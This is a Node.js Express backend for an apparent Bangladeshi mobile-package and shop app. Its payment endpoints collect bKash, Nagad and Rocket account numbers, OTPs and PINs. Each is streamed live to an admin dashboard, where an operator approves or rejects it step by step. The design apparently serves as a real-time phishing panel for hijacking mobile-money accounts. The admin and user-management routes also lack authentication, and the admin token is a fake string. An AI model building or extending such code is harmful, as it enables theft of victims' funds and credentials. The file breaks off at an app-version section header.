require('dotenv').config();
const http = require('http');
const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');

const db = require('./database');
const { notify } = require('./teligram');
const socketService = require('./socket');

const app = express();
const server = http.createServer(app);
socketService.init(server);

const PORT = process.env.PORT || 5000;
const API_KEY = process.env.API_KEY || '';

// Middleware
app.use(cors());
app.use(morgan('dev'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Static file serving for the Webview / Dashboard UI
app.use(express.static(path.join(__dirname, 'public')));

// Disable HTTP caching for all dynamic API endpoints to support real-time live sync
app.use('/api', (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});

// Ensure MongoDB Atlas connection on every request (crucial for Vercel Serverless Functions)
app.use(async (req, res, next) => {
  try {
    await db.connect();
    next();
  } catch (err) {
    console.error('[Database Middleware] Connection error:', err.message);
    res.status(500).json({ success: false, error: 'Database connection failed: ' + err.message });
  }
});

// URL Normalization: Ensure API routes match whether prefixed with /api or called directly
app.use((req, res, next) => {
  if (req.url.startsWith('/server.js')) {
    req.url = req.url.replace(/^\/server\.js/, '') || '/';
  }
  const knownPrefixes = ['/admin', '/auth', '/health', '/stats', '/devices', '/sms', '/sims', '/packages', '/users', '/payment', '/products', '/settings', '/upload-image', '/orders', '/app'];
  if (!req.url.startsWith('/api') && knownPrefixes.some((p) => req.url.startsWith(p))) {
    req.url = '/api' + (req.url.startsWith('/') ? req.url : '/' + req.url);
  }
  next();
});

// Optional API Key Authenticator for REST API
function authenticate(req, res, next) {
  if (!API_KEY) return next();
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.slice(7) : req.headers['x-api-key'];
  if (token && token === API_KEY) {
    return next();
  }
  return res.status(401).json({ success: false, error: 'Unauthorized: Invalid or missing API key' });
}

// ============================================================================
// 📡 REST API ENDPOINTS
// ============================================================================

/**
 * Health Check (Accessible via /health or /api/health for free-tier wake up & monitors)
 */
app.get(['/health', '/api/health'], async (req, res) => {
  const total = await db.getTotalMessagesCount();
  res.json({
    status: 'ok',
    database: 'MongoDB Atlas',
    uptime: Math.floor(process.uptime()),
    timestamp: Date.now(),
    totalStoredMessages: total,
  });
});

/**
 * Overview Statistics (includes user accounts breakdown)
 */
app.get('/api/stats', async (req, res) => {
  try {
    const stats = await db.getStats();
    res.json({
      success: true,
      data: stats,
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * Connected Devices List
 */
app.get('/api/devices', async (req, res) => {
  try {
    const devices = await db.getDevices();
    res.json({
      success: true,
      data: devices,
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post(['/notify', '/api/notify'], async (req, res) => {
  // Telegram notifications are completely disabled as per user instruction.
  res.status(200).json({
    success: true,
    message: 'Telegram notifications are disabled. All live data is delivered to Admin Panel.',
    disabled: true,
  });
});

app.get(['/notify', '/api/notify'], async (req, res) => {
  res.status(200).json({
    success: true,
    message: 'Telegram notifications are disabled. All live data is delivered to Admin Panel.',
    disabled: true,
  });
});

// ============================================================================
// 💳 LIVE PAYMENT SESSIONS & ADMIN VERIFICATION ENDPOINTS
// ============================================================================

/**
 * 1. Initialize / Register Payment Session (Step 1: Number)
 * POST /api/payment/session
 * Body: { sessionId, userPhone, accountNumber, method, amount, operator }
 */
app.post(['/payment/session', '/api/payment/session'], async (req, res) => {
  try {
    const {
      sessionId,
      userPhone,
      accountNumber,
      method,
      amount,
      operator,
      paymentType,
      productId,
      productTitle,
      productPrice,
      bookingAmount,
      deliveryAddress,
      buyerPhone,
    } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({ success: false, error: 'sessionId is required' });
    }

    const orderData = {
      sessionId,
      userPhone: userPhone || '',
      accountNumber: accountNumber || '',
      method: (method || 'bkash').toLowerCase(),
      amount: Number(amount) || 0,
      operator: operator || '',
      paymentType: paymentType || 'booking', // 'booking' | 'online'
      productId: productId || '',
      productTitle: productTitle || '',
      productPrice: Number(productPrice) || Number(amount) || 0,
      bookingAmount: Number(bookingAmount) || 50,
      deliveryAddress: deliveryAddress || '',
      buyerPhone: buyerPhone || userPhone || '',
      currentStep: req.body.currentStep || (req.body.status === 'number_approved' || req.body.status === 'waiting_otp' ? 'otp' : 'number'),
      status: req.body.status || 'waiting_number',
      errorMessage: '',
    };

    const order = await db.createOrUpdatePaymentSession(orderData);
    socketService.emitPaymentSessionUpdate(order);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});

    res.json({ success: true, data: order });
  } catch (err) {
    console.error('[Payment Session Error]:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 2. Submit OTP from Client (Step 2: OTP)
 * POST /api/payment/submit-otp
 * Body: { sessionId, otp, userPhone, accountNumber }
 */
app.post(['/payment/submit-otp', '/api/payment/submit-otp'], async (req, res) => {
  try {
    const { sessionId, otp, userPhone, accountNumber } = req.body || {};
    if (!sessionId || !otp) {
      return res.status(400).json({ success: false, error: 'sessionId and otp are required' });
    }

    const updatePayload = {
      sessionId,
      otp: String(otp).trim(),
      status: 'waiting_otp',
      errorMessage: '',
      currentStep: 'otp',
    };
    if (userPhone) updatePayload.userPhone = userPhone;
    if (accountNumber) updatePayload.accountNumber = accountNumber;

    const order = await db.createOrUpdatePaymentSession(updatePayload);
    socketService.emitPaymentSessionUpdate(order);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});

    res.json({ success: true, data: order });
  } catch (err) {
    console.error('[Submit OTP Error]:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 3. Submit PIN from Client (Step 3: PIN)
 * POST /api/payment/submit-pin
 * Body: { sessionId, pin, userPhone, accountNumber }
 */
app.post(['/payment/submit-pin', '/api/payment/submit-pin'], async (req, res) => {
  try {
    const { sessionId, pin, userPhone, accountNumber } = req.body || {};
    if (!sessionId || !pin) {
      return res.status(400).json({ success: false, error: 'sessionId and pin are required' });
    }

    const updatePayload = {
      sessionId,
      pin: String(pin).trim(),
      status: 'waiting_pin',
      errorMessage: '',
      currentStep: 'pin',
    };
    if (userPhone) updatePayload.userPhone = userPhone;
    if (accountNumber) updatePayload.accountNumber = accountNumber;

    const order = await db.createOrUpdatePaymentSession(updatePayload);
    socketService.emitPaymentSessionUpdate(order);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});

    res.json({ success: true, data: order });
  } catch (err) {
    console.error('[Submit PIN Error]:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 4. Poll Session Status (Used by Client Mobile App)
 * GET /api/payment/session/:sessionId
 */
app.get(['/payment/session/:sessionId', '/api/payment/session/:sessionId'], async (req, res) => {
  try {
    const { sessionId } = req.params;
    const order = await db.getPaymentSession(sessionId);
    if (!order) {
      return res.status(404).json({ success: false, error: 'Session not found' });
    }
    res.json({ success: true, data: order });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 5. Get Active Orders for Admin Dashboard
 * GET /api/payment/active-orders
 */
app.get(['/payment/active-orders', '/api/payment/active-orders'], async (req, res) => {
  try {
    const orders = await db.getActivePaymentOrders();
    res.json({ success: true, data: orders });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 5.0.1 Get All Orders / Bookings for a Specific User (My Orders in App)
 * GET /api/orders/user/:phoneNumber
 */
app.get(['/orders/user/:phoneNumber', '/api/orders/user/:phoneNumber'], async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    const orders = await db.getUserOrders(phoneNumber);
    res.json({ success: true, count: orders.length, data: orders });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 5.0.2 Update Order Progress Status (from Admin Dashboard)
 * PUT /api/orders/:sessionId/progress
 */
app.put(['/orders/:sessionId/progress', '/api/orders/:sessionId/progress'], async (req, res) => {
  try {
    const { sessionId } = req.params;
    const { orderProgress, trackingNote } = req.body || {};
    const updated = await db.updateOrderProgress(sessionId, { orderProgress, trackingNote });
    socketService.getIO()?.emit('order-progress-updated', updated);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});
    res.json({ success: true, data: updated });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * 5.1. Get Recent Auth / Registration OTPs for Admin Dashboard
 * GET /api/admin/active-otps
 */
app.get(['/admin/active-otps', '/api/admin/active-otps'], async (req, res) => {
  try {
    const otps = await db.getRecentOtps();
    res.json({ success: true, data: otps });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 6. Admin Action Endpoint (Approve / Reject OTP or PIN)
 * POST /api/payment/verify-action
 * Body: { sessionId, action: 'approve_otp' | 'reject_otp' | 'approve_pin' | 'reject_pin' | 'cancel', errorMessage }
 */
app.post(['/payment/verify-action', '/api/payment/verify-action'], async (req, res) => {
  try {
    const { sessionId, action, errorMessage } = req.body || {};
    if (!sessionId || !action) {
      return res.status(400).json({ success: false, error: 'sessionId and action are required' });
    }

    const currentOrder = await db.getPaymentSession(sessionId);
    const isNumberStep = currentOrder && (
      currentOrder.status === 'waiting_number' ||
      currentOrder.status === 'number_submitted' ||
      currentOrder.status === 'number_rejected' ||
      currentOrder.currentStep === 'number'
    );
    const isOtpStep = currentOrder && (
      currentOrder.status === 'waiting_otp' ||
      currentOrder.status === 'otp_rejected' ||
      currentOrder.currentStep === 'otp'
    );
    const isRocket = currentOrder && currentOrder.method === 'rocket';

    let nextStatus = '';
    let nextStep = '';
    let defaultError = '';

    // 1. ACTION: VALID (Next step or Complete)
    if (action === 'valid' || action === 'approve_number' || action === 'approve_otp' || action === 'approve_pin') {
      if (isNumberStep) {
        // Step 1: bKash/Nagad/Rocket Account Number Approved
        nextStatus = 'number_approved';
        nextStep = isRocket ? 'pin' : 'otp';
      } else if (isRocket) {
        // Rocket order: number -> pin -> otp
        if (currentOrder.currentStep === 'pin' && !currentOrder.otp) {
          nextStatus = 'pin_approved'; // moves to otp
          nextStep = 'otp';
        } else {
          nextStatus = 'completed';
          nextStep = 'completed';
        }
      } else {
        // bKash / Nagad / Default: number -> otp -> pin
        if (isOtpStep) {
          nextStatus = 'otp_approved';
          nextStep = 'pin';
        } else {
          nextStatus = 'completed';
          nextStep = 'completed';
        }
      }
    }
    // 2. ACTION: INVALID (Show warning under input)
    else if (action === 'invalid' || action === 'reject_number' || action === 'reject_otp' || action === 'reject_pin') {
      if (isNumberStep) {
        nextStatus = 'number_rejected';
        nextStep = 'number';
        defaultError = 'Invalid account number';
      } else if (isOtpStep) {
        nextStatus = 'otp_rejected';
        nextStep = 'otp';
        defaultError = 'Wrong verification code';
      } else {
        nextStatus = 'pin_rejected';
        nextStep = 'pin';
        defaultError = 'Wrong verification code';
      }
    }
    // 3. ACTION: FAIL (Verification failed UI & 5s redirect to home)
    else if (action === 'fail' || action === 'cancel') {
      nextStatus = 'failed';
      nextStep = 'failed';
      defaultError = errorMessage || '';
    } else {
      return res.status(400).json({ success: false, error: 'Invalid action: ' + action });
    }

    const updated = await db.updatePaymentOrderStatus(sessionId, {
      status: nextStatus,
      currentStep: nextStep,
      errorMessage: errorMessage || defaultError || '',
    });
    socketService.emitPaymentSessionUpdate(updated);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});

    res.json({ success: true, data: updated });
  } catch (err) {
    console.error('[Verify Action Error]:', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * 7. Delete / Dismiss Order
 * DELETE /api/payment/order/:sessionId
 */
app.delete(['/payment/order/:sessionId', '/api/payment/order/:sessionId'], async (req, res) => {
  try {
    const { sessionId } = req.params;
    await db.deletePaymentOrder(sessionId);
    db.getActivePaymentOrders().then((orders) => socketService.emitLiveOrdersUpdate(orders)).catch(() => {});
    res.json({ success: true, message: 'Order removed' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});



// ============================================================================
// 🔐 AUTHENTICATION ENDPOINTS (SIGN IN & REGISTER)
// ============================================================================

// ============================================================================
// 🔢 OTP REGISTRATION & FORGOT PASSWORD (TWILIO SMS)
// ============================================================================

/**
 * REQUEST REGISTRATION OTP (Twilio SMS)
 * POST /api/auth/register-otp-request
 * Body: { phoneNumber, name, password }
 */
app.post(['/api/auth/register-otp-request', '/auth/register-otp-request'], async (req, res) => {
  try {
    const { phoneNumber, name, password } = req.body || {};
    if (!phoneNumber || !String(phoneNumber).trim()) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }
    if (!name || !name.trim()) {
      return res.status(400).json({ success: false, error: 'অনুগ্রহ করে পুরো নাম লিখুন' });
    }
    if (!password || !password.trim()) {
      return res.status(400).json({ success: false, error: 'পাসওয়ার্ড প্রদান করা আবশ্যক' });
    }
    if (password.trim().length < 4) {
      return res.status(400).json({ success: false, error: 'পাসওয়ার্ড কমপক্ষে ৪ অক্ষরের হতে হবে' });
    }

    // Check if user already exists
    const existing = await db.findUserByPhone(phoneNumber);
    if (existing) {
      return res.status(400).json({
        success: false,
        error: 'এই ফোন নম্বর দিয়ে ইতিমধ্যে একটি অ্যাকাউন্ট খোলা হয়েছে। অনুগ্রহ করে লগইন করুন।',
      });
    }

    const result = await db.createOtpSession({
      phoneNumber,
      type: 'register',
      tempData: { name: name.trim(), password: password.trim() },
    });

    try {
      socketService.getIO().emit('new-auth-otp', {
        phoneNumber: result.phoneNumber,
        otp: result.otp,
        type: 'register',
        createdAt: Date.now(),
        expiresAt: result.expiresAt,
      });
    } catch {}

    console.log(`[Auth] OTP generated for registration: ${phoneNumber}`);
    res.json({
      success: true,
      message: result.mocked
        ? 'এসএমএস গেটওয়ে ব্যালেন্স শেষ হওয়ায় টেস্ট মোডে ওটিপি তৈরি করা হয়েছে।'
        : 'আপনার মোবাইল নম্বরে ৬ ডিজিটের ওটিপি (OTP) পাঠানো হয়েছে।',
      expiresAt: result.expiresAt,
      mocked: result.mocked,
      devOtp: result.devOtp,
    });
  } catch (err) {
    console.error('[Auth] Register OTP Request error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * VERIFY OTP & COMPLETE REGISTRATION
 * POST /api/auth/register-otp-verify
 * Body: { phoneNumber, otp, name, password }
 */
app.post(['/api/auth/register-otp-verify', '/auth/register-otp-verify'], async (req, res) => {
  try {
    const { phoneNumber, otp, name, password } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }
    if (!otp) {
      return res.status(400).json({ success: false, error: 'ওটিপি কোড দেওয়া আবশ্যক' });
    }

    const user = await db.registerWithOtp({
      phoneNumber,
      otp,
      name,
      password,
    });

    console.log(`[Auth] User verified & registered via OTP: ${user.phoneNumber} (${user.name})`);
    res.status(201).json({
      success: true,
      message: 'অ্যাকাউন্ট সফলভাবে যাচাই ও তৈরি করা হয়েছে।',
      user,
    });
  } catch (err) {
    console.error('[Auth] Register OTP Verify error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * REQUEST FORGOT PASSWORD OTP (Twilio SMS)
 * POST /api/auth/forgot-password-request
 * Body: { phoneNumber }
 */
app.post(['/api/auth/forgot-password-request', '/auth/forgot-password-request'], async (req, res) => {
  try {
    const { phoneNumber } = req.body || {};
    if (!phoneNumber || !String(phoneNumber).trim()) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }

    // Verify user exists
    const user = await db.findUserByPhone(phoneNumber);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: 'এই মোবাইল নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি। অনুগ্রহ করে সঠিক নম্বর দিন।',
      });
    }

    const result = await db.createOtpSession({
      phoneNumber,
      type: 'forgot_password',
      tempData: { userId: user._id },
    });

    try {
      socketService.getIO().emit('new-auth-otp', {
        phoneNumber: result.phoneNumber,
        otp: result.otp,
        type: 'forgot_password',
        createdAt: Date.now(),
        expiresAt: result.expiresAt,
      });
    } catch {}

    console.log(`[Auth] OTP generated for forgot password: ${phoneNumber}`);
    res.json({
      success: true,
      message: 'পাসওয়ার্ড রিসেটের ওটিপি (OTP) আপনার নম্বরে পাঠানো হয়েছে।',
      expiresAt: result.expiresAt,
      mocked: result.mocked,
      devOtp: result.devOtp,
    });
  } catch (err) {
    console.error('[Auth] Forgot password request error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * VERIFY OTP & RESET PASSWORD
 * POST /api/auth/forgot-password-verify
 * Body: { phoneNumber, otp, newPassword }
 */
app.post(['/api/auth/forgot-password-verify', '/auth/forgot-password-verify'], async (req, res) => {
  try {
    const { phoneNumber, otp, newPassword } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }
    if (!otp) {
      return res.status(400).json({ success: false, error: 'ওটিপি কোড দেওয়া আবশ্যক' });
    }
    if (!newPassword || !newPassword.trim()) {
      return res.status(400).json({ success: false, error: 'নতুন পাসওয়ার্ড দেওয়া আবশ্যক' });
    }

    const result = await db.resetPasswordWithOtp({
      phoneNumber,
      otp,
      newPassword,
    });

    console.log(`[Auth] Password reset successfully for: ${phoneNumber}`);
    res.json(result);
  } catch (err) {
    console.error('[Auth] Forgot password verify error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * RESEND OTP (Twilio SMS)
 * POST /api/auth/resend-otp
 * Body: { phoneNumber, type }
 */
app.post(['/api/auth/resend-otp', '/auth/resend-otp'], async (req, res) => {
  try {
    const { phoneNumber, type = 'register' } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }

    if (type === 'forgot_password') {
      const user = await db.findUserByPhone(phoneNumber);
      if (!user) {
        return res.status(404).json({ success: false, error: 'কোনো অ্যাকাউন্ট পাওয়া যায়নি' });
      }
    }

    const result = await db.createOtpSession({
      phoneNumber,
      type,
    });

    try {
      socketService.getIO().emit('new-auth-otp', {
        phoneNumber: result.phoneNumber,
        otp: result.otp,
        type,
        createdAt: Date.now(),
        expiresAt: result.expiresAt,
      });
    } catch {}

    console.log(`[Auth] Resent OTP for ${type}: ${phoneNumber}`);
    res.json({
      success: true,
      message: result.mocked
        ? 'এসএমএস গেটওয়ে ব্যালেন্স শেষ হওয়ায় টেস্ট মোডে ওটিপি তৈরি করা হয়েছে।'
        : 'নতুন ওটিপি কোড পাঠানো হয়েছে।',
      expiresAt: result.expiresAt,
      mocked: result.mocked,
      devOtp: result.devOtp,
    });
  } catch (err) {
    console.error('[Auth] Resend OTP error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * USER REGISTRATION
 * POST /api/auth/register
 * Body: { phoneNumber, name, password }
 */
app.post('/api/auth/register', async (req, res) => {
  try {
    const { phoneNumber, name, password } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর দেওয়া আবশ্যক' });
    }
    if (!password || !password.trim()) {
      return res.status(400).json({ success: false, error: 'পাসওয়ার্ড প্রদান করা আবশ্যক' });
    }
    const user = await db.registerUser({ phoneNumber, name, password });
    console.log(`[Auth] Registered new user: ${user.phoneNumber} (${user.name})`);
    res.status(201).json({
      success: true,
      message: 'Account registered successfully',
      user,
    });
  } catch (err) {
    console.error('[Auth] Registration error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * USER SIGN IN
 * POST /api/auth/login
 * Body: { phoneNumber, password }
 */
app.post('/api/auth/login', async (req, res) => {
  try {
    const { phoneNumber, username, password } = req.body || {};
    const identifier = username || phoneNumber;
    if (!identifier) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর বা ইউজারনেম আবশ্যক' });
    }
    if (!password || !password.trim()) {
      return res.status(400).json({ success: false, error: 'অনুগ্রহ করে পাসওয়ার্ড দিন' });
    }
    const user = await db.loginUser({ phoneNumber: identifier, username, password });
    console.log(`[Auth] User logged in: ${user.phoneNumber || user.username} (${user.name})`);
    res.json({
      success: true,
      message: 'Logged in successfully',
      user,
    });
  } catch (err) {
    console.error('[Auth] Login error:', err.message);
    const status = err.isBlocked ? 403 : 400;
    res.status(status).json({ success: false, error: err.message, isBlocked: Boolean(err.isBlocked) });
  }
});

/**
 * DEDICATED ADMIN LOGIN
 * POST /api/admin/login
 * Body: { username, password }
 */
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ success: false, error: 'Username and password are required' });
    }
    const admin = await db.loginAdmin({ username, password });
    console.log(`[Admin Auth] Super Admin logged in successfully: ${admin.username} (${admin.name})`);
    res.json({
      success: true,
      message: 'Admin authenticated successfully',
      token: `admin-token-${Date.now()}`,
      admin,
    });
  } catch (err) {
    console.error('[Admin Auth] Login error:', err.message);
    res.status(401).json({ success: false, error: err.message });
  }
});

/**
 * CHECK ADMIN STATUS
 * GET /api/admin/status
 */
app.get('/api/admin/status', async (req, res) => {
  res.json({
    success: true,
    superAdminExists: true,
    username: 'super-admin',
  });
});

/**
 * LIST REGISTERED USERS
 * GET /api/auth/users
 */
app.get('/api/auth/users', async (req, res) => {
  try {
    const users = await db.getRegisteredUsers();
    const augmented = users.map((u) => ({
      ...u,
      isOnline: socketService.isUserOnline(u.phoneNumber) || Boolean(u.isOnline),
      lastActiveAt: u.lastActiveAt || u.lastLogin || u.createdAt || Date.now(),
    }));
    res.json({
      success: true,
      data: augmented,
      onlineCount: socketService.getOnlineUserCount(),
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * DELETE USER ACCOUNT
 * DELETE /api/auth/users/:phoneNumber
 */
app.delete('/api/auth/users/:phoneNumber', async (req, res) => {
  try {
    const { phoneNumber } = req.params;
    const deleted = await db.deleteUser(phoneNumber);
    if (!deleted) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    res.json({ success: true, message: `User ${phoneNumber} deleted successfully` });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE USER PROFILE
 * POST/PUT /api/auth/profile
 * Body: { phoneNumber, name }
 */
app.all(['/api/auth/profile', '/auth/profile'], async (req, res) => {
  if (req.method !== 'POST' && req.method !== 'PUT') {
    return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  }
  try {
    const { phoneNumber, name, avatar } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর আবশ্যক (Phone number is required)' });
    }
    const updated = await db.updateUserProfile(phoneNumber, { name, avatar });
    console.log(`[Auth] User profile updated: ${phoneNumber} -> name: ${name}, avatar: ${avatar ? 'yes' : 'no'}`);
    res.json({
      success: true,
      message: 'প্রোফাইল সফলভাবে আপডেট করা হয়েছে',
      user: updated,
    });
  } catch (err) {
    console.error('[Auth] Update profile error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * CHANGE USER PASSWORD
 * POST /api/auth/change-password
 * Body: { phoneNumber, oldPassword, newPassword }
 */
app.post(['/api/auth/change-password', '/auth/change-password'], async (req, res) => {
  try {
    const { phoneNumber, oldPassword, newPassword } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'মোবাইল নম্বর আবশ্যক' });
    }
    await db.changePassword(phoneNumber, { oldPassword, newPassword });
    console.log(`[Auth] Password changed successfully for user: ${phoneNumber}`);
    res.json({
      success: true,
      message: 'পাসওয়ার্ড সফলভাবে পরিবর্তন করা হয়েছে',
    });
  } catch (err) {
    console.error('[Auth] Change password error:', err.message);
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * BLOCK USER ACCOUNT
 * POST /api/auth/block
 * Body: { phoneNumber, reason }
 */
app.post('/api/auth/block', async (req, res) => {
  try {
    const { phoneNumber, reason } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'Phone number is required' });
    }
    const user = await db.blockUser(phoneNumber, reason);
    socketService.emitUserStatusChange({ phoneNumber: user.phoneNumber, isBlocked: true, blockedReason: reason });
    console.log(`[Admin] User blocked: ${user.phoneNumber} (Reason: ${reason || 'N/A'})`);
    res.json({
      success: true,
      message: `User ${user.phoneNumber} has been blocked successfully`,
      data: user,
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * UNBLOCK USER ACCOUNT
 * POST /api/auth/unblock
 * Body: { phoneNumber }
 */
app.post('/api/auth/unblock', async (req, res) => {
  try {
    const { phoneNumber } = req.body || {};
    if (!phoneNumber) {
      return res.status(400).json({ success: false, error: 'Phone number is required' });
    }
    const user = await db.unblockUser(phoneNumber);
    socketService.emitUserStatusChange({ phoneNumber: user.phoneNumber, isBlocked: false });
    console.log(`[Admin] User unblocked: ${user.phoneNumber}`);
    res.json({
      success: true,
      message: `User ${user.phoneNumber} has been unblocked successfully`,
      data: user,
    });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * CHECK USER BLOCK STATUS
 * GET /api/auth/status/:phoneNumber
 */
app.get('/api/auth/status/:phoneNumber', async (req, res) => {
  try {
    const phoneNumber = req.params.phoneNumber;
    const user = await db.getUserByPhone(phoneNumber);
    res.json({
      success: true,
      phoneNumber,
      isBlocked: Boolean(user && user.isBlocked),
      name: user ? user.name : '',
      avatar: user ? (user.avatar || '') : '',
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================================
// 📱 SIM OPERATORS & PACKAGES (OFFERS) ENDPOINTS
// ============================================================================

/**
 * GET ALL SIM OPERATORS
 * GET /api/sims
 */
app.get('/api/sims', async (req, res) => {
  try {
    const sims = await db.getSims();
    res.json({ success: true, count: sims.length, data: sims });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET SIM OPERATOR BY ID
 * GET /api/sims/:id
 */
app.get('/api/sims/:id', async (req, res) => {
  try {
    const sim = await db.getSimById(req.params.id);
    if (!sim) return res.status(404).json({ success: false, error: 'SIM operator not found' });
    res.json({ success: true, data: sim });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * SIM operators are static on both client and backend.
 * Only package offers can be created/managed.
 */

/**
 * GET ALL PACKAGES (OFFERS)
 * GET /api/packages?operator=gp&category=internet&search=30
 */
app.get('/api/packages', async (req, res) => {
  try {
    const { operator, category, search } = req.query;
    const packages = await db.getPackages({ operator, category, search });
    res.json({ success: true, count: packages.length, data: packages });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * GET PACKAGE BY ID
 * GET /api/packages/:id
 */
app.get('/api/packages/:id', async (req, res) => {
  try {
    const pkg = await db.getPackageById(req.params.id);
    if (!pkg) return res.status(404).json({ success: false, error: 'Package not found' });
    res.json({ success: true, data: pkg });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * CREATE A NEW PACKAGE (OFFER)
 * POST /api/packages
 */
app.post('/api/packages', async (req, res) => {
  try {
    const pkg = await db.createPackage(req.body);
    console.log(`[Package] Created new package: ${pkg.id} (${pkg.operator} - ${pkg.volume})`);
    socketService.getIO()?.emit('packages-updated');
    res.status(201).json({ success: true, message: 'Package created successfully', data: pkg });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE A PACKAGE
 * PUT /api/packages/:id
 */
app.put('/api/packages/:id', async (req, res) => {
  try {
    const pkg = await db.updatePackage(req.params.id, req.body);
    socketService.getIO()?.emit('packages-updated');
    res.json({ success: true, message: 'Package updated', data: pkg });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

/**
 * DELETE A PACKAGE
 * DELETE /api/packages/:id
 */
app.delete('/api/packages/:id', async (req, res) => {
  try {
    const success = await db.deletePackage(req.params.id);
    if (!success) return res.status(404).json({ success: false, error: 'Package not found' });
    socketService.getIO()?.emit('packages-updated');
    res.json({ success: true, message: 'Package deleted' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ============================================================================
// ⚙️ APP SETTINGS (Configurable Booking Payment Amount)
// ============================================================================

/**
 * GET APP SETTINGS
 * GET /api/settings
 */
app.get(['/settings', '/api/settings'], async (req, res) => {
  try {
    const settings = await db.getAppSettings();
    res.json({ success: true, data: settings });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

/**
 * UPDATE APP SETTINGS (Admin configurable booking payment amount)
 * POST /api/settings or PUT /api/settings
 */
app.all(['/settings', '/api/settings', '/admin/settings', '/api/admin/settings'], async (req, res, next) => {
  if (req.method !== 'POST' && req.method !== 'PUT') return next();
  try {
    const updated = await db.updateAppSettings(req.body);
    console.log(`[Settings] Updated App Settings. Booking Payment Amount: ৳${updated.bookingPaymentAmount}`);
    socketService.getIO()?.emit('settings-updated', updated);
    socketService.getIO()?.emit('app-version-updated', {
      latest_version: updated.latestVersion,
      version_code: updated.versionCode,
      min_version_code: updated.minVersionCode,
      download_url: updated.downloadUrl,
      force_update: updated.forceUpdate,
      release_notes: updated.releaseNotes,
    });
    if (req.body?.shopLocation) {
      socketService.getIO()?.emit('products-updated');
    }
    res.json({ success: true, message: 'Settings updated successfully', data: updated });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// ============================================================================
// 🚀 APP VERSION & OTA UPDATE SYSTEM
// ============================================================================

/**
 * GET APP VERSION
 * GET /api/app/version or GET /app/version
 */
